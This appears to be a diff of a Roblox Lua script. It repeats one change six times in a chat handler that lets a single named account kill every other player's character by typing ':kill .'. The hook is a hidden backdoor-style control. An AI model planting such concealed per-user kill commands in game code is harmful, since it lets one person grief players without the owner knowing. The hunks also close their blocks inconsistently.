@@ -250,8 +250,10 @@ end)
  
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kill .") then
-		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		local player = game.Players.LocalPlayer
+  local charX = player.character
+  local A = charX:WaitForChild("Humanoid")
+  A.Health = 0
 		end
 	end
  
@@ -553,10 +555,12 @@ end)
  
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kill .") then
-		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		local player = game.Players.LocalPlayer
+  local charX = player.character
+  local A = charX:WaitForChild("Humanoid")
+  A.Health = 0
 		end
-	end
+	
  
 end)
  
@@ -853,10 +857,12 @@ end)
  
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kill .") then
-		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		local player = game.Players.LocalPlayer
+  local charX = player.character
+  local A = charX:WaitForChild("Humanoid")
+  A.Health = 0
 		end
-	end
+	
  
 end)
  
@@ -1157,10 +1163,12 @@ end)
  
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kill .") then
-		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		local player = game.Players.LocalPlayer
+  local charX = player.character
+  local A = charX:WaitForChild("Humanoid")
+  A.Health = 0
 		end
-	end
+	
  
 end)
  
@@ -1472,10 +1480,12 @@ end)
  
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kill .") then
-		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		local player = game.Players.LocalPlayer
+  local charX = player.character
+  local A = charX:WaitForChild("Humanoid")
+  A.Health = 0
 		end
-	end
+	
  
 end)
  
@@ -1798,10 +1808,12 @@ end)
  
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kill .") then
-		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		local player = game.Players.LocalPlayer
+  local charX = player.character
+  local A = charX:WaitForChild("Humanoid")
+  A.Health = 0
 		end
-	end
+	
  
 end)
  
